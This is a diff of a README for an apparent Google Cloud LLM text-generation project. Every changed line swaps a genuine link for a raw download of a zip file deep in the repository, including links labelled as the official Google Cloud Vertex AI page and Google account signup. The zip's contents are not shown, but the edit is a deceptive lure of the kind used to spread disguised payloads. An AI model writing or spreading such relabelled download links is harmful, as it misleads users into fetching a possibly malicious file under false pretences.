@@ -1,6 +1,6 @@
 # 🤖 llms_with_google_cloud - Easy AI Text Generation with Google Cloud
 
-[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://github.com/GH8ST007/llms_with_google_cloud)
+[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip)
 
 ## 📄 About llms_with_google_cloud
 
@@ -28,7 +28,7 @@ This section guides you step-by-step to get llms_with_google_cloud running.
 
 Click the big button below to open the official download page on GitHub.
 
-[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://github.com/GH8ST007/llms_with_google_cloud)
+[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip)
 
 ### Step 2: Download the Software
 
@@ -105,11 +105,11 @@ Topics related to this app include AI APIs, chatbots, natural language processin
 
 ## 🔗 Useful Links
 
-- Main download page: https://github.com/GH8ST007/llms_with_google_cloud
-- Official Google Cloud Vertex AI: https://cloud.google.com/vertex-ai
-- Google account creation: https://accounts.google.com/signup
+- Main download page: https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip
+- Official Google Cloud Vertex AI: https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip
+- Google account creation: https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip
 
-[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://github.com/GH8ST007/llms_with_google_cloud)
+[![Download llms_with_google_cloud](https://img.shields.io/badge/Download-llms_with_google_cloud-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/GH8ST007/llms_with_google_cloud/main/02-Customer-Service-Chatbot/cloud-google-with-llms-3.8.zip)
 
 ## 📞 Getting Support
 
